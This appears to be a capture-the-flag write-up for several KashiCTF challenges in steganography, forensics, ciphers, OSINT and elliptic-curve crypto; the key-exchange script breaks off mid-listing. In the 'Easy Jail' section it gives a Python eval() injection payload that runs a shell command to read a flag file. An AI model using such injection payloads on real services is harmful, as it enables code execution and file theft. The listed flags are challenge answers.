                   *** SNOWy Evening (misc)***

A friend of mine , Aakash has gone missing and the only thing we found is this poem...Weirdly, he had a habit of keeping his name as the password.

*the hint is Snow* 

*and password is Aakash*

```
''''Pity, in place of love,			       	       			  
That pettiest of gifts,      	     	    		      	       	       
Is but a sugar-coating over neglect. 		 	   	  	 
Any passerby can make a gift of it 	  	   	  	   	       
To a street beggar,   	    	       		    	     	  	   
Only to forget the moment the first corner is turned.   	 
I had not hoped for anything more that day.	 	      		   
       	  	   	 	      	  	  	   	       	      
You left during the last watch of night.   		  		 
I had hoped you would say goodbye,     	   	     	 	     	 
Just say ‘Adieu’ before going away,  	 
What you had said another day,
What I shall never hear again.
In their place, just that one word,
Bound by the thin fabric of a little compassion
Would even that have been too much for you to bear?

When I first awoke from sleep
My heart fluttered with fear
Lest the time had been over.
I rushed out of bed.
The distant church clock chimed half past twelve
I sat waiting near the door of my room
Resting my head against it,
Facing the porch through which you would come out.''''
```


so i use stegsnow to find the hidden text: " stegsnow  -C -p "Aakash" poemm.txt "

"-C" is encode 
"-p" is password 

and i see : pastebin.com/HVQfa14Z

after open see the weird things OOOMoOMoOMoOMoOMoOMoOMoOMoOMMMmoOMMMMMMmoOMMMMOOMOomO.....

so i search for google and know it is The COW programming language

decode it: https://frank-buss.de/cow.html

Flag is: **KashiCTF{Love_Hurts_5734b5f}**


                Easy Jail
                
I made this calculator. I have a feeling that it's not safe :(

we get the script 

```
ef calc(op):
	try : 	
		res = eval(op)
	except :
		return print("Wrong operation")
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		calc(inp)

if __name__ == '__main__':
	main()
```

the injection we can exploit is eval()

so we use  "__import__("os").system("cat /flag.txt")"

to get flag:   **KashiCTF{3V4L_41NT_54F3_TKMi5GVr}**


****Memories Bring Back You,Corruption

use autospy you will see flag:

KashiCTF{FSCK_mE_B1T_by_b1t_Byt3_by_byT3}


    
    
***Restaurant***

read hex of this file ![pasta](https://hackmd.io/_uploads/BkkNb9hc1x.jpg)

"BA AB AA AB BB AA BA AB AB BA BA BA AA AB AA BA AA AA AB AA BA AA AA AB AA AA AA AA BA BA AB AB AA BA BA AB AB AB AB BA AA AB AA BB AB AB BA BA BA AB AB AA AA BB AA AA BB A0"

we recognize that is Bacon cipher 

choose A/B 

Flag: KashiCTF{THEYWEREREALLLLYCOOKING}


**Look at me **

![Look_at_me](https://hackmd.io/_uploads/Bk_Tb9nq1l.jpg)

i search for google and see the tools Silenteye

use it by window version and get flag:

KashiCTF{K33p_1t_re4l}


**Kings (OSINT) **

Did you know the cosmic weapons like this? I found similar example of such weapons on the net and it was even weirder. This ruler's court artist once drew the most accurate painting of a now extinct bird. Can you tell me the coordinates upto 4 decimal places of the place where this painting is right now.

![Weapon_1](https://hackmd.io/_uploads/ry_dz5391g.jpg)


use chatgpt to find it and pay attention to this paragraph ***"such weapons on the net and it was even weirder***"  

i found to solution for this Egypt and Indian

and it is actually in Mughal Indian and the bird extince is DoDo bird 
Ustad Mansur's painting of a dodo is in the Hermitage Museum in St. Petersburg, Russia

Flag: KashiCTF{59.9399_30.3149}

**Key Exchange (Crypto) **

we use chatgpt to code it 

```
#!/usr/bin/env python3
import socket
import re
import json
import hashlib
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def modinv(a, p):
    return pow(a, -1, p)

def ec_add(P, Q, a, p):
    if P is None:
        return Q
    if Q is None:
        return P
    if P[0] == Q[0] and (P[1] + Q[1]) % p == 0:
        return None
    if P != Q:
        s = ((Q[1] - P[1]) * modinv(Q[0] - P[0], p)) % p
    else:
        s = ((3 * P[0] * P[0] + a) * modinv(2 * P[1], p)) % p
    x_r = (s * s - P[0] - Q[0]) % p
    y_r = (s * (P[0] - x_r) - P[1]) % p
    return (x_r, y_r)

def ec_mul(k, P, a, p):
    result = None
    addend = P
    while k:
        if k & 1:
            result = ec_add(result, addend, a, p)
        addend = ec_add(addend, addend, a, p)
        k //= 2
    return result

# Tham số đường cong NIST P-384
p = 39402006196394479212279040100143613805079739270465446667948293404245721771496870329047266088258938001861606973112319
a = -3
b = 27580193559959705877849011840389048093056905856361568521428707301988689241309860865136260764883745107765439761230575
G = (
    26247035095799689268623156744566981891852923491109213387815615900925518854738050089022388053975719786650872476732087,
    832571096148902998554675128952010

```

we get this:
FLAG: NaeusGRX{L_r3H3Nv3h_kq_Sun1Vm_O3w_4fg_4lx_1_t0d_a4q_lk1s_X0hcc_Dd4J_TPsecRms}

Hint: DamnKeys

it is Vigenere cipher 

Flag: KashiCTF{I_r3V3Al3d_my_Pub1Ic_K3y_4nd_4ll_1_g0t_w4s_th1s_L0usy_Fl4G_TDfuyTup}
